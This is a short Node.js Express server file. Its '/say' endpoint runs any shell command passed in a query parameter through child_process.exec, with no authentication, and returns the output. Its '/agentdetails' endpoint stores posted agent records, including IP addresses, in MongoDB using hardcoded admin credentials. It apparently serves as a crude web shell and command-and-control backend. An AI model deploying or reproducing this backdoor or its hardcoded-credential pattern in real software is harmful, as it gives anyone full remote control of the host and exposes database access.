const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
var exec = require('child_process').exec;
var MongoClient = require('mongodb').MongoClient
var url = 'mongodb://admin:india@192.168.208.140:27017/admin';

const app = express();
const port = 4000;

app.use(cors());
app.use(bodyParser.json({limit: '50mb'}));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

app.get('/say', (req, res) => {

let  command = req.query.shell
var ip = req.header('X-Forwarded-For');
console.log(ip);
var header = req.header('User-Agent');
console.log(header);
exec(command, function(err, stdout, stderr) {if (err){console.log(stderr);res.send(stderr);}else {console.log(stdout);res.send(stdout);}});

});

app.get('/hi', (req, res) => {
var ip = req.connection.remoteAddress;
let  command = req.query.hello;
let answer="I am listening you";
res.send(answer);
console.log(ip);
});


app.post('/agentdetails', (req, res) => {
  let  agent_data = req.body;
  
  if(agent_data){
    console.log("agent_data is: ",agent_data);
    console.log("IP Address is : ",  agent_data.ip)
    res.send("your data recieved");
  }else {
  console.log('No data recieved')
  }
  // insert into mongo
  MongoClient.connect(url ,function(err, db) {
    console.log("Connected correctly to server");
    var db1 = db.db("agents");
    console.log("Switched to "+db1.databaseName+" database");
    
    var myquery = { "agent_name" : agent_data.agent_name };
    var newvalues = { $set: agent_data };
    var upsert = { "upsert" : true }

    db1.collection('agent_details').updateOne(myquery, newvalues,upsert, function(err, result) {
         if (err) throw err;
       console.log("Collection is created! into  "+db1.databaseName+" database");
       db.close();
  
       });
      });
  

});


app.listen(port, () => {
  console.log('Server started on port '+port);
  });




